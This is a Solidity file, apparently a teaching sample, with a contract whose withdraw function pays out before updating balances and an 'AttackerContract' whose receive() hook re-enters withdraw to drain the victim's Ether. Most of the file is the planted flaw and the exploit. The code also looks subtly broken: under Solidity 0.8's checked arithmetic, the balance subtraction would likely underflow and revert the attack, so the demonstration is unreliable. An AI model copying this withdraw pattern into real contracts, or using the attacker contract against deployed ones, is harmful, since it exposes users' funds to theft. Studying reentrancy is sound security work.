// Vulnerable contract
pragma solidity ^0.8.0;

contract VulnerableContract {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient funds");
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        balances[msg.sender] -= _amount;
    }
}

// Attacker's contract
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract AttackerContract {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = VulnerableContract(_vulnerableContractAddress);
    }

    function attack() public payable {
        vulnerableContract.deposit{value: msg.value}();
        vulnerableContract.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vulnerableContract).balance >= msg.value) {
            vulnerableContract.withdraw(msg.value);
        }
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }

    function withdrawFunds() public {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}
